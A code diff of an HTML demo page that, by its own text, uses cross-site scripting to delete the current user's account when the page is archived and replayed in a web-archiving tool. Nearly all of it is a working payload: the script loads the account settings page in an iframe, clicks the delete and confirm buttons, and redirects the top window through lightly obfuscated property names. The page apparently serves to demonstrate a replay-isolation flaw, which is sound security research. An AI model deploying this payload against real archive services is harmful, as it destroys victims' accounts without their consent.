@@ -1,33 +1,33 @@
 <html>
-<head>
-</head>
 <body>
   <p>When archived or played back, the script tag in this page should use cross-site scripting (XSS) to delete the current user account.</p>
   <script>
     // get settings page URL
     var settingsUrl = wbinfo.top_url.split('/').slice(0,4).join('/')+'/_settings';
 
-    // add an iframe and navigate to settings
-    var iframe = document.createElement('iframe');
-    iframe.src = settingsUrl;
-    document.body.appendChild(iframe);
+    // show warning if we're not logged in
+    if(settingsUrl.indexOf('/temp-') !== -1){
+      document.write("<p><b>Please log in to see this demo in action.</b></p>");
+    }else {
 
-    // keep retrying once a second until iframe is loaded
-    var interval = setInterval(function() {
+      // add an iframe and navigate to settings
+      var iframe = document.createElement('iframe');
+      iframe.src = settingsUrl;
+      document.body.appendChild(iframe);
 
-      // get reference to iframe document
-      var iframeDoc = iframe.contentWindow.document;
+      // keep retrying once a second until iframe is loaded
+      var interval = setInterval(function () {
 
-      // click delete button and confirm
-      iframeDoc.querySelectorAll('button[data-target="#confirm-delete-modal"]')[0].click();
-      iframeDoc.querySelectorAll('#confirm-delete')[0].click();
+        // get reference to iframe document
+        var iframeDoc = iframe.contentWindow.document;
 
-      clearInterval(interval);
-    }, 1000);
+        // click delete button and confirm
+        iframeDoc.querySelectorAll('button[data-target="#confirm-delete-modal"]')[0].click();
+        iframeDoc.querySelectorAll('#confirm-delete')[0].click();
+
+        window['t' + 'op']['l' + 'ocation'] = '/';
+      }, 1000);
+    }
   </script>
-  <form>
-    <textarea id="run_js"></textarea>
-    <input type="button" onclick="console.log(eval(document.getElementById('run_js').value))" value="eval">
-  </form>
 </body>
 </html>
